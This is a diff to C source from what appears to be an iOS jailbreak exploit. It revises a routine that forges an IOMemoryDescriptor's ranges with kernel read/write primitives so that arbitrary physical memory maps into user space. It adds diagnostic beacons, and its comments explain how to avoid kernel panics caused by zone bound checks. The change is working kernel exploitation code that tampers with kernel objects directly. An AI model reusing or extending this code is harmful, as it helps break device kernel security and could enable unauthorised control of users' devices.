@@ -172,11 +172,18 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)surface,
 	             (unsigned long long)desc, (unsigned long long)ranges);
 
-	// v74: record the ORIGINAL descriptor state before any rewrite — the
-	// step2-null-base verdict needs a pre-write baseline to interpret.
-	jb_tr_beacon("KMAP pre,r0=%llx,r1=%llx,d70=%llx,d18=%llx,d90=%llx",
-	             (unsigned long long)kread64(ranges),
-	             (unsigned long long)kread64(ranges + 8),
+	// v75: desc-side pre-state baseline. NOTE: v74's baseline read
+	// kread64(ranges)/kread64(ranges+8) — the ranges ELEMENT is a 16-byte
+	// kalloc.type6.16 object and ClearSword's fixed 32-byte RMW tripped
+	// zone bound checks → kernel panic 2026-09-05 21:37:02. LAW: never aim
+	// a ClearSword primitive at a sub-32-byte kernel object. All reads
+	// below are INSIDE the (large) memory descriptor object.
+	jb_tr_beacon("KMAP pre,desc,r60=%llx,r50=%llx,f20=%x,m28=%llx,w88=%x,d70=%llx,d18=%llx,d90=%llx",
+	             (unsigned long long)kread64(desc + 0x60),
+	             (unsigned long long)kread64(desc + 0x50),
+	             (unsigned int)kread32(desc + 0x20),
+	             (unsigned long long)kread64(desc + 0x28),
+	             (unsigned int)kread8(desc + 0x88),
 	             (unsigned long long)kread64(desc + 0x70),
 	             (unsigned long long)kread64(desc + 0x18),
 	             (unsigned long long)kread64(desc + 0x90));
@@ -192,25 +199,23 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		uint64_t fakeRanges_kva = phystokv(vtophys(ttep_self(), (uint64_t)fakeRanges));
 		jb_tr_beacon("KMAP fakeranges,kva=%llx", (unsigned long long)fakeRanges_kva);
 		IOMemoryDescriptor_set_ranges(desc, fakeRanges_kva);
-		// v74: readback — did the ranges-field swap land, and does the
-		// kernel-side alias of our fake struct read back pa/size?
-		jb_tr_beacon("KMAP rb,ranges,now=%llx,via=%llx,%llx",
+		// v75: verify the swap via the DESC field only (never read the
+		// 16-byte ranges element through the primitive).
+		jb_tr_beacon("KMAP rb,ranges,now=%llx,expect=%llx",
 		             (unsigned long long)IOMemoryDescriptor_get_ranges(desc),
-		             (unsigned long long)kread64(fakeRanges_kva),
-		             (unsigned long long)kread64(fakeRanges_kva + 8));
+		             (unsigned long long)fakeRanges_kva);
 		cleanups = realloc(cleanups, ++cleanupsCount * sizeof(struct IOSurface_toCleanup));
 		cleanups[cleanupsCount-1].descriptor = desc;
 		cleanups[cleanupsCount-1].origRanges = ranges;
 		cleanups[cleanupsCount-1].fakeRangesUA = fakeRanges;
 	}
 	else {
+		// v75 NOTE: this branch (minsafe<=0x10) writes the 16-byte ranges
+		// ELEMENT via kwrite64 — ClearSword's 32-byte RMW would trip zone
+		// bound checks on it (panic 2026-09-05 21:37:02 class). Branch is
+		// dead today (minsafe=0x20) but must never run without rework.
 		kwrite64(ranges, pa);
 		kwrite64(ranges+8, size);
-		// v74: readback of the direct pokes (dead branch today — minsafe=0x20
-		// — but if it ever runs it must self-verify).
-		jb_tr_beacon("KMAP rb,direct,%llx,%llx",
-		             (unsigned long long)kread64(ranges),
-		             (unsigned long long)kread64(ranges + 8));
 	}
 
 	IOMemoryDescriptor_set_size(desc, size);
@@ -232,6 +237,18 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);
 
 	IOMemoryDescriptor_set_memRef(desc, 0);
+
+	// v75: full post-rewrite desc readback — diff against `pre,desc` names
+	// the exact setter that mangled (or failed to mangle) the descriptor.
+	jb_tr_beacon("KMAP post,desc,r60=%llx,r50=%llx,f20=%x,m28=%llx,w88=%x,d70=%llx,d18=%llx,d90=%llx",
+	             (unsigned long long)kread64(desc + 0x60),
+	             (unsigned long long)kread64(desc + 0x50),
+	             (unsigned int)kread32(desc + 0x20),
+	             (unsigned long long)kread64(desc + 0x28),
+	             (unsigned int)kread8(desc + 0x88),
+	             (unsigned long long)kread64(desc + 0x70),
+	             (unsigned long long)kread64(desc + 0x18),
+	             (unsigned long long)kread64(desc + 0x90));
 
 	IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
 	void *mappedBase = IOSurfaceGetBaseAddress(mappedSurfaceRef);
